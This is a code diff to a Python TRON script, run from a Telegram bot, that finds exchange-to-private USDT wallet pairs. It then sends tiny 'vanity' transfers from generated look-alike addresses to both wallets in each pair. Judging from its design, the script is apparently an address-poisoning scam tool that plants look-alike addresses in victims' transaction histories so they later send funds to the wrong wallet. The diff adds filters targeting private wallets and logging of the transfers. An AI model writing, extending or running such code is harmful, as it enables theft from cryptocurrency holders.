@@ -7,16 +7,14 @@ from tronpy import Tron
 from tronpy.keys import PrivateKey
 
 # =========================
-# 🟢 USER SETTINGS
+#  USER SETTINGS
 # =========================
-TARGET_PAIRS = 5             # How many pairs to find before pausing for commands
-MIN_BALANCE_USD = 500        
-MIN_TRANSFER_USD = 150       
-REQUIRED_CONSECUTIVE = 2     
-WINDOW_DAYS = 7              
-
-# Estimated Gas Cost per pair (in TRX)
-GAS_COST_PER_PAIR_TRX = 2.2 
+TARGET_PAIRS = 5
+MIN_BALANCE_USD = 500
+MIN_TRANSFER_USD = 150
+REQUIRED_CONSECUTIVE = 2
+WINDOW_DAYS = 7
+GAS_COST_PER_PAIR_TRX = 2.2
 
 CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']
 
@@ -35,6 +33,9 @@ if not all([TELEGRAM_BOT_TOKEN, CHAT_ID, TRONGRID_API_KEY, TRONSCAN_API_KEY, PRI
 tron = Tron()
 main_wallet = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', ''))).public_key.to_base58check_address()
 TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
+
+# Transaction logs storage
+transaction_logs = []
 
 # =========================
 # 2. TELEGRAM FUNCTIONS
@@ -90,7 +91,6 @@ def get_trx_balance(address):
     return int(data["data"][0].get("balance", 0)) / 1_000_000
 
 def get_recent_usdt_receivers(limit=50):
-    """Fetches recent USDT transfers using TronScan (more reliable for global searches)."""
     end_ms = int(datetime.now(timezone.utc).timestamp() * 1000)
     start_ms = int((datetime.now(timezone.utc) - timedelta(hours=1)).timestamp() * 1000)
     
@@ -136,7 +136,7 @@ def send_zero_value_trx(from_priv_hex, to_address):
     try:
         priv = PrivateKey(bytes.fromhex(from_priv_hex.replace('0x', '')))
         sender = priv.public_key.to_base58check_address()
-        txn = tron.trx.transfer(sender, to_address, 1).build().sign(priv) # 1 SUN = $0 value
+        txn = tron.trx.transfer(sender, to_address, 1).build().sign(priv)
         result = txn.broadcast()
         return result.txid
     except Exception as e:
@@ -147,8 +147,10 @@ def send_zero_value_trx(from_priv_hex, to_address):
 # 5. MAIN INTERACTIVE LOOP
 # =========================
 def main():
-    print(f"🚀 Starting scan. Target: {TARGET_PAIRS} pairs.")
-    send_telegram_alert(f"🚀 <b>Scan Started</b>\nTarget: {TARGET_PAIRS} pairs.\nI will pause when found and wait for your commands.")
+    global transaction_logs
+    
+    print(f" Starting scan. Target: {TARGET_PAIRS} pairs (CEX→Private).")
+    send_telegram_alert(f"🚀 <b>Scan Started</b>\nTarget: {TARGET_PAIRS} pairs\nLooking for: <b>CEX (Wallet A) → Private Wallet (Wallet B)</b>\nI will pause when found.")
     
     now = datetime.now(timezone.utc)
     start_ms = int((now - timedelta(days=WINDOW_DAYS)).timestamp() * 1000)
@@ -168,13 +170,18 @@ def main():
             if wallet_b in checked_wallets: continue
             checked_wallets.add(wallet_b)
             
-            is_b_cex, _ = check_if_cex(wallet_b)
-            if is_b_cex: continue
+            # ✅ NEW RULE: Wallet B MUST NOT be a CEX (must be private)
+            is_b_cex, b_cex_name = check_if_cex(wallet_b)
+            if is_b_cex:
+                print(f" Wallet B {wallet_b} is CEX ({b_cex_name}). Skipping.")
+                continue
                 
+            # Check balance
             usdt_bal = get_usdt_balance(wallet_b)
             trx_bal = get_trx_balance(wallet_b)
             if usdt_bal + (trx_bal * 0.25) < MIN_BALANCE_USD: continue
                 
+            # Fetch transfers
             data = trongrid_get(f"/v1/accounts/{wallet_b}/transactions/trc20", {
                 "only_confirmed": "true", "only_to": "true", "limit": 10, "order_by": "block_timestamp,desc",
                 "min_timestamp": start_ms, "max_timestamp": end_ms, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
@@ -187,19 +194,32 @@ def main():
                 tx1, tx2 = transfers[i], transfers[i+1]
                 if tx1["from"] == tx2["from"] and tx1["amount"] >= MIN_TRANSFER_USD and tx2["amount"] >= MIN_TRANSFER_USD:
                     wallet_a = tx1["from"]
+                    
+                    # ✅ NEW RULE: Wallet A MUST be a CEX
                     is_a_cex, a_cex_name = check_if_cex(wallet_a)
-                    found_pairs.append({"wallet_a": wallet_a, "wallet_b": wallet_b, "is_a_cex": is_a_cex, "a_cex_name": a_cex_name, "txids": [tx1["txid"], tx2["txid"]]})
-                    send_telegram_alert(f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS} Found!</b>\nA: <code>{wallet_a}</code>{' (CEX)' if is_a_cex else ''}\nB: <code>{wallet_b}</code>")
+                    if not is_a_cex:
+                        print(f" Wallet A {wallet_a} is NOT a CEX. Skipping.")
+                        break
+                    
+                    found_pairs.append({
+                        "wallet_a": wallet_a, 
+                        "wallet_b": wallet_b, 
+                        "a_cex_name": a_cex_name,
+                        "txids": [tx1["txid"], tx2["txid"]]
+                    })
+                    
+                    send_telegram_alert(f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS} Found!</b>\n <b>Wallet A (CEX - {a_cex_name})</b>: <code>{wallet_a}</code>\n <b>Wallet B (Private)</b>: <code>{wallet_b}</code>")
                     break
         if len(found_pairs) < TARGET_PAIRS: time.sleep(30)
 
     # --- PHASE 2: INTERACTIVE WAITING ROOM ---
     send_telegram_alert(
-        f"🎯 <b>Target Reached! Found {len(found_pairs)} pairs.</b>\n\n"
-        f"Please review and use the following commands:\n"
-        f"• Type <b>info</b> to see wallet details and total gas cost.\n"
-        f"• Type <b>exclude [Address]</b> to remove a wallet from the list.\n"
-        f"• Type <b>transfer</b> to execute the $0 vanity transfers."
+        f"🎯 <b>Target Reached! Found {len(found_pairs)} CEX→Private pairs.</b>\n\n"
+        f"<b>Available Commands:</b>\n"
+        f"• <b>info</b> - Show wallet details & total cost\n"
+        f"• <b>exclude [Address]</b> - Remove a wallet\n"
+        f"• <b>logs [date]</b> - View transaction logs (e.g., <i>logs July 1</i>)\n"
+        f"• <b>transfer</b> - Execute $0 vanity transfers"
     )
     
     last_update_id = 0
@@ -221,8 +241,7 @@ def main():
                     msg += f"Est. Gas Cost: {GAS_COST_PER_PAIR_TRX} TRX per pair\n"
                     msg += f"<b>Total Required: {total_cost:.2f} TRX</b>\n\n"
                     for i, p in enumerate(found_pairs):
-                        cex_tag = f" (A is {p['a_cex_name']})" if p['is_a_cex'] else ""
-                        msg += f"<b>Pair {i+1}:</b>\nA: <code>{p['wallet_a']}</code>{cex_tag}\nB: <code>{p['wallet_b']}</code>\n\n"
+                        msg += f"<b>Pair {i+1}:</b>\n🏦 A ({p['a_cex_name']}): <code>{p['wallet_a']}</code>\n👤 B (Private): <code>{p['wallet_b']}</code>\n\n"
                     send_telegram_alert(msg)
                 
                 elif text.lower().startswith("exclude"):
@@ -235,9 +254,36 @@ def main():
                         if removed > 0:
                             send_telegram_alert(f"🗑️ Excluded {removed} pair(s) containing <code>{addr_to_exclude}</code>.")
                         else:
-                            send_telegram_alert(f"❌ Address <code>{addr_to_exclude}</code> not found in current list.")
+                            send_telegram_alert(f"❌ Address <code>{addr_to_exclude}</code> not found.")
                     else:
-                        send_telegram_alert("⚠️ Usage: <b>exclude [Address]</b>")
+                        send_telegram_alert("️ Usage: <b>exclude [Address]</b>")
+                
+                # ✅ NEW COMMAND: LOGS
+                elif text.lower().startswith("logs"):
+                    if not transaction_logs:
+                        send_telegram_alert("📭 No transactions completed yet in this session.")
+                    else:
+                        # Parse date if provided (e.g., "logs July 1")
+                        parts = text.split(" ", 1)
+                        filter_date = parts[1].lower() if len(parts) > 1 else None
+                        
+                        msg = "📜 <b>Transaction Logs</b>\n\n"
+                        if filter_date:
+                            msg += f"Filtered by date: <i>{filter_date}</i>\n\n"
+                        
+                        for i, log in enumerate(transaction_logs):
+                            log_date = log['timestamp'].split('T')[0]
+                            if filter_date and filter_date not in log_date.lower():
+                                continue
+                            msg += f"<b>#{i+1}</b> - {log_date}\n"
+                            msg += f"Vanity: <code>{log['vanity_wallet'][:20]}...</code>\n"
+                            msg += f"TX1: <code>{log['tx1'][:20]}...</code>\n"
+                            msg += f"TX2: <code>{log['tx2'][:20]}...</code>\n\n"
+                        
+                        if len(msg) > 4000:
+                            msg = msg[:4000] + "\n<i>(truncated)</i>"
+                        
+                        send_telegram_alert(msg)
                 
                 elif text.lower() == "transfer":
                     if not found_pairs:
@@ -245,7 +291,7 @@ def main():
                     else:
                         send_telegram_alert(f"🚀 <b>Trigger Accepted!</b>\nExecuting $0 transfers for {len(found_pairs)} pairs...")
                         execution_triggered = True
-                        break 
+                        break
         
         if not execution_triggered:
             time.sleep(5)
@@ -266,9 +312,20 @@ def main():
         
         tx2 = send_zero_value_trx(vanity_priv, wallet_a)
         
-        cex_status = f" (Wallet A is {pair['a_cex_name']})" if pair['is_a_cex'] else ""
-        msg = (f"🧪 <b>Experiment {i+1} Complete{cex_status}</b>\n"
-               f"Vanity: <code>{vanity_addr}</code>\n"
+        # Log the transaction
+        transaction_logs.append({
+            "timestamp": datetime.now(timezone.utc).isoformat(),
+            "wallet_a": wallet_a,
+            "wallet_b": wallet_b,
+            "vanity_wallet": vanity_addr,
+            "tx1": tx1,
+            "tx2": tx2,
+            "cex_name": pair['a_cex_name']
+        })
+        
+        msg = (f" <b>Experiment {i+1} Complete</b>\n"
+               f" CEX ({pair['a_cex_name']}): <code>{wallet_a}</code>\n"
+               f"🎭 Vanity: <code>{vanity_addr}</code>\n"
                f"TX1: <code>{tx1}</code>\nTX2: <code>{tx2}</code>")
         send_telegram_alert(msg)
         time.sleep(5)
